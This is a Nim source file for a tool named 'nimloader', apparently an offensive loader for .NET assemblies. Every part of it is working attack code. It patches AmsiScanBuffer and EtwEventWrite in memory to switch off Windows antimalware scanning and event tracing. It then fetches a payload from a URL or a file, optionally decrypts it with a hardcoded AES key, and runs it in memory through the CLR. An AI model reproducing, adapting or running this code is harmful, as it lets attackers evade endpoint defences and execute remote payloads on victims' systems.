import strutils # basic string manipulation functionality
import dynlib # for our AMSI and EDR bypass
import byteutils # basic byte manipulation functionality 
import nimcrypto # for decryption
import nimcrypto/sysrand # for decryption
import winim/lean # for core SDK only, this speed up compiling time.
import strformat # string formatting
import sugar # assembly dump functionality
import winim/clr except `[]`     # Common Language Runtime Support. Exclude []  or it throws a runtime recursion error!
import shlex #parameter splitting
import std/httpclient
import puppy # using ssl connections
import parseopt
import os # to get parameters



const iv: array[aes256.sizeBlock, byte]= [byte 148, 181, 90, 151, 26, 242, 253, 114, 7, 217, 24, 204, 125, 203, 26, 167]
const envkey: string = "myverysecretkey"

var debug=false
var version="nimloader 1.6"
















func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

func toString*(bytes: openArray[byte]): string {.inline.} =
  ## Converts a byte sequence to the corresponding string.
  let length = bytes.len
  if length > 0:
    result = newString(length)
    copyMem(result.cstring, bytes[0].unsafeAddr, length)


proc decryptText(contents: string,passkeystr: string): string =  
    # some var definitions for decrypting
    var 
        data: seq[byte] = toByteSeq(contents) # contains array of bytes with the content of file
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte] # byte array the size of key
        plaintext = newSeq[byte](len(data)) # blank array of bytes to contain plaintext
        transformedText = newSeq[byte](len(data)) # blank array of bytes to contain decrypted

    if debug:    
      echo "Step 0: copy incomming array of bytes to plaintext array "
    copyMem(addr plaintext[0], addr data[0], len(data)) #copy incoming array of bytes to plaintext array
    # Expand key to 32 bytes using SHA256 as the KDF
    var expandedkey = sha256.digest(passkeystr) # digest of our key

    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data)) # copy digest to key array
    ectx.init(key, iv) 

    if debug:    
      echo "step 1: Decrypting"
    ectx.decrypt(plaintext, transformedText) # decrypt plaintext into transformedText
    if debug:    
      echo "step 2: Convert to string"

    var newText=transformedText.toString() # convert tranformed text to string
    result = newText


proc downloadV1(url: string):string=
    var client = newHttpClient()
    var text: string=""
    text=client.getContent(url)
    result=text.strip(leading = true, trailing = true)

proc download(url: string):string=
    var text: string=""
    text=fetch(url)
    result=text.strip(leading = true, trailing = true)

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    when defined amd64:
        if debug:
          echo "[*] Running in x64 process"
        const patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        if debug:    
          echo "[*] Running in x86 process"
        const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        if debug:
          echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        if debug:
          echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        if debug:
          echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled



proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    when defined amd64:
        if debug:
          echo "[*] Running in x64 process"
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        if debug:
          echo "[*] Running in x86 process"
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

    amsi = loadLib("amsi")
    if isNil(amsi):
        if debug:
          echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        if debug:
          echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        if debug:
          echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled





when isMainModule:

    var decrypt: bool=false # option to decrypt
    var force: bool=false # force run regardless of successes
    var inFile: string= "" # will hold input byte array file
    var helpMsg: string="""
    nimLoader.exe [-d] [-D] [-f] [-k]  <fileOrUrl.txt> [parameters for the file]
    -d: Decrypt file or url
    -D: Debug
    -f: force execution regardless of bypass success
    -k key: key for decryption. Defaults to myverysecretkey
    -v: show version
    """ # help msg
    var parameters: string="" # parameters to the program to launch
    var passkeystr:string=envkey# default key to our constant




    var p = initOptParser(commandLineParams()) #command line parameters
    while true:
      p.next()
      case p.kind
      of cmdArgument:
        #echo "argument: " & p.key
        if inFile=="": # no file yet, add the file
          inFile=p.key # argument input file
          break


      of cmdLongOption, cmdShortOption:
        #echo "short: " & p.key
        case p.key
        of "d": #decrypt option
          decrypt=true
        of "f": #force all the way
          force=true       
        of "D": #debug
          debug=true
        of "v": #version
          echo version
          quit(QuitSuccess)
        of "h": # help message
          echo helpMsg
          quit(QuitSuccess)

      of cmdEnd:
        break

    parameters = join(p.remainingArgs, " ")


    if inFile=="":
      quit(QuitFailure)


    
    #######################
    # PATCH AMSI
    #######################
    var success = PatchAmsi()
    if debug:
      echo fmt"[*] AMSI disabled: {bool(success)}"

    if not success:
      if debug:
        echo "[-] AMSI not disabled:"
      if not force: # go on regardless
        quit()

    #######################
    # PATCH ETW
    #######################

    success = Patchntdll()
    if debug:
      echo fmt"[*] ETW blocked by patch: {bool(success)}"


    #######################
    # GET THE TOOL'S BYTES
    #######################

    var contents: string=""
    if debug:
      echo "Identify input:", inFile

    if inFile[0..6]=="http://" or inFile[0..7]=="https://":
      contents =download(inFile)
      if debug:
        echo "Input is Url. Downloading and loading"
    else:
      contents = readFile(inFile).strip(leading = true, trailing = true)# read file contents
      if debug:
        echo "Input is File. Loading"



    if debug:
      echo "Tool parameters are:" & parameters

    if decrypt: # DECRYPT IF NECESSARY
      if debug:
        echo "Decrypting the file..."
      contents=decryptText(contents,passkeystr).strip(leading = true, trailing = true)

    let payloadStr:string=contents

    if debug:
      echo "payloadStr start:"
      echo payloadStr[0..30]        
      echo "payloadStr end:"
      echo payloadStr[^20..^1]

    let payloadParts=payloadStr.split(",") # split bytes
    var buf:seq[byte] # define buf as bytes seq
    if debug:
      echo "Adding to buffer..."
    for i in payloadParts:
      # echo i
      buf.add(hexToSeqByte(i))


    if debug:
      echo "[*].NET versions"
      for v in clrVersions():
          # echo fmt"    \--- {v}"
          echo v
      echo "\n"

    if debug:
      echo "Loading buffer to assembly..."    
    var assembly = load(buf)
    if debug:
      echo "Dumping assembly..."    
    dump assembly

    if debug:
      echo "Loading parameter array..."    
    var arr = toCLRVariant(shlex(parameters).words, VT_BSTR) # passing some args
    if debug:
      echo "Invoking assembly..."    
    assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
    if debug:
      echo "Done!"    


